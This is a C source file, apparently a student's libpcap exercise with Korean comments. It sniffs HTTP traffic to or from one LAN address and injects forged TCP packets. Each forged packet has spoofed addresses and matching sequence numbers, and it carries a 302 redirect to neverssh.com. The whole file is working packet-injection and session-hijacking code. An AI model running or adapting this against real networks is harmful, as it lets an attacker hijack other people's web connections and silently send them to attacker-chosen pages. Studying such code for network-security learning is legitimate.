#define _DEFAULT_SOURCE
#define __USE_BSD
#define __FAVOR_BSD

#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>

unsigned short csum(unsigned short *ptr, int nbytes) {
  register long sum;
  unsigned short oddbyte;
  register short answer;
  sum = 0;
  while (nbytes > 1) {
    sum += *ptr++;
    nbytes -= 2;
  }
  if (nbytes == 1) {
    oddbyte = 0;
    *((u_char *)&oddbyte) = *(u_char *)ptr;
    sum += oddbyte;
  }
  sum = (sum >> 16) + (sum & 0xffff);
  sum = sum + (sum >> 16);
  answer = (short)~sum;
  return (answer);
}

typedef struct {
  pcap_if_t *dev;
  pcap_t *handle;
} Device;

void packet_handler(u_char *user, const struct pcap_pkthdr *pkthdr,
                    const u_char *packet);
int main(void) {
  pcap_if_t *alldevs;
  Device devices[2];

  char errbuf[PCAP_ERRBUF_SIZE];
  struct bpf_program fp;
  char filter_name[] = "tcp port 80";

  if (pcap_findalldevs(&alldevs, errbuf) == -1) {
    fprintf(stderr, "Error finding devices: %s\n", errbuf);
    return EXIT_FAILURE;
  }

  if (alldevs == NULL) {
    fprintf(stderr, "No devices found.\n");
    return EXIT_FAILURE;
  }

  alldevs = alldevs->next;
  alldevs = alldevs->next;

  for (int i = 0; i < 2; i++) {
    if (alldevs == NULL) {
      fprintf(stderr, "Not enough devices found.\n");
      return EXIT_FAILURE;
    }
    devices[i].dev = alldevs;
    alldevs = alldevs->next;
  }

  devices[0].handle =
      pcap_open_live(devices[0].dev->name, BUFSIZ, 1, 1000, errbuf);
  devices[1].handle =
      pcap_open_live(devices[1].dev->name, BUFSIZ, 0, 0, errbuf);

  printf("[성공] >>>\n");
  printf("스니퍼: [%s], 인젝터: [%s]\n", devices[0].dev->name,
         devices[1].dev->name);

  if (pcap_datalink(devices[0].handle) != DLT_EN10MB) {
    fprintf(stderr, "이더넷 장비가 아닙니다.%s \n",
            pcap_geterr(devices[0].handle));
    pcap_close(devices[0].handle);
    pcap_close(devices[1].handle);
    pcap_freealldevs(alldevs);
    return EXIT_FAILURE;
  }

  if (pcap_compile(devices[0].handle, &fp, filter_name, 1,
                   PCAP_NETMASK_UNKNOWN) == -1) {
    fprintf(stderr, "컴파일 에러 %s \n", pcap_geterr(devices[0].handle));
    pcap_close(devices[0].handle);
    pcap_close(devices[1].handle);
    pcap_freealldevs(alldevs);
    return EXIT_FAILURE;
  }

  if (pcap_setfilter(devices[0].handle, &fp) == -1) {
    fprintf(stderr, "규칙적용 에러 %s\n", pcap_geterr(devices[0].handle));
    pcap_freecode(&fp);
    pcap_close(devices[0].handle);
    pcap_close(devices[1].handle);
    pcap_freealldevs(alldevs);
    return EXIT_FAILURE;
  }
  pcap_freecode(&fp);

  pcap_loop(devices[0].handle, 10, packet_handler,
            (u_char *)(devices[1].handle));

  pcap_close(devices[0].handle);
  pcap_close(devices[1].handle);
  pcap_freealldevs(alldevs);

  return EXIT_SUCCESS;
}
void packet_handler(u_char *user, const struct pcap_pkthdr *pkthdr,
                    const u_char *packet) {
  static int count = 1;
  struct ether_header *e_hdr = (struct ether_header *)packet;
  if (ntohs(e_hdr->ether_type) != ETHERTYPE_IP)
    return;

  struct ip *i_hdr = (struct ip *)(packet + sizeof(struct ether_header));
  in_addr_t compare = inet_addr("192.168.1.17");

  if (i_hdr->ip_src.s_addr != compare && i_hdr->ip_dst.s_addr != compare)
    return;
  if (i_hdr->ip_p != IPPROTO_TCP)
    return;

  int ip_hdr_len = (i_hdr->ip_hl) * 4;
  struct tcphdr *t_hdr =
      (struct tcphdr *)(packet + sizeof(struct ether_header) + ip_hdr_len);
  if (ntohs(t_hdr->source) != 80 && ntohs(t_hdr->dest) != 80)
    return;

  // 데이터의 길이 구하기 -> 0이면 탈출
  int ip_end_len = ntohs(i_hdr->ip_len);
  int tcp_end_len = ip_end_len - ip_hdr_len;
  int tcp_hdr_len = (t_hdr->th_off) * 4;
  u_int32_t data_len = tcp_end_len - tcp_hdr_len;
  printf("%d번째 패킷\n", count++);
  printf("seq: [%u], ack: [%u]\n", ntohl(t_hdr->seq), ntohl(t_hdr->ack_seq));
  printf("data_len: [%d]\n", data_len);
  if (data_len == 0)
    return;

  u_char inject_packet[1500];
  memset(inject_packet, 0, sizeof(inject_packet));

  struct ether_header *e_hdr_i = (struct ether_header *)inject_packet;
  struct ip *i_hdr_i =
      (struct ip *)(inject_packet + sizeof(struct ether_header));
  struct tcphdr *t_hdr_i =
      (struct tcphdr *)(inject_packet + sizeof(struct ether_header) +
                        ip_hdr_len);

  int ether_ip_tcp_len = sizeof(struct ether_header) + ip_hdr_len + tcp_hdr_len;
  u_char *redirect_data = inject_packet + ether_ip_tcp_len;

  memcpy(inject_packet, packet, ether_ip_tcp_len);
  memcpy(e_hdr_i->ether_dhost, e_hdr->ether_shost, ETHER_ADDR_LEN);
  memcpy(e_hdr_i->ether_shost, e_hdr->ether_dhost, ETHER_ADDR_LEN);

  i_hdr_i->ip_src = i_hdr->ip_dst;
  i_hdr_i->ip_dst = i_hdr->ip_src;

  t_hdr_i->source = t_hdr->dest;
  t_hdr_i->dest = t_hdr->source;

  t_hdr_i->th_seq = t_hdr->th_ack;
  t_hdr_i->th_ack = htonl(ntohl(t_hdr->th_seq) + data_len);

  char redirect_page[] = "HTTP/1.1 302 Found\r\n"
                         "Location: http://neverssh.com\r\n"
                         "Content-Length: 0\r\n"
                         "Connection: close\r\n"
                         "\r\n";
  memcpy(redirect_data, redirect_page, sizeof(redirect_page));
  int real_data_len = strlen(redirect_page);
  i_hdr_i->ip_len = htons(ip_hdr_len + tcp_hdr_len + real_data_len);

  typedef struct {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder; // 항상 0
    u_int8_t protocol;    // 항상 IPPROTO_TCP (6)
    u_int16_t tcp_length; // TCP 헤더 길이 + 데이터(페이로드) 길이
  } Pseudo_header;

  Pseudo_header check_tcp;
  check_tcp.source_address = i_hdr_i->ip_src.s_addr;
  check_tcp.dest_address = i_hdr_i->ip_dst.s_addr;
  check_tcp.placeholder = 0;
  check_tcp.protocol = IPPROTO_TCP;
  check_tcp.tcp_length = htons(tcp_hdr_len + real_data_len);

  int check_tcp_len = sizeof(Pseudo_header) + tcp_hdr_len + real_data_len;
  u_char *temp = malloc(check_tcp_len);

  memcpy(temp, (char *)&check_tcp, sizeof(Pseudo_header));
  // 이부분이 제일 이해하기 난해하네.. temp는 동적할당된 곳의 주소를 물고있는데
  // 구조체의 주소로 덮어씌워주는 느낌으로 이해된다..
  
  i_hdr_i->ip_sum = 0;
  t_hdr_i->th_sum = 0;
  memcpy(temp + sizeof(Pseudo_header), t_hdr_i, tcp_hdr_len + real_data_len);

  i_hdr_i->ip_sum = csum((unsigned short *)i_hdr_i, ip_hdr_len);
  t_hdr_i->th_sum = csum((unsigned short *)temp, check_tcp_len);

  free(temp);

  pcap_t *inject_handle = (pcap_t *)user;

  if (pcap_inject(inject_handle, inject_packet,
                  sizeof(struct ether_header) + ntohs(i_hdr_i->ip_len)) == -1)
    printf("실패\n");
  else
    printf("성공\n");
}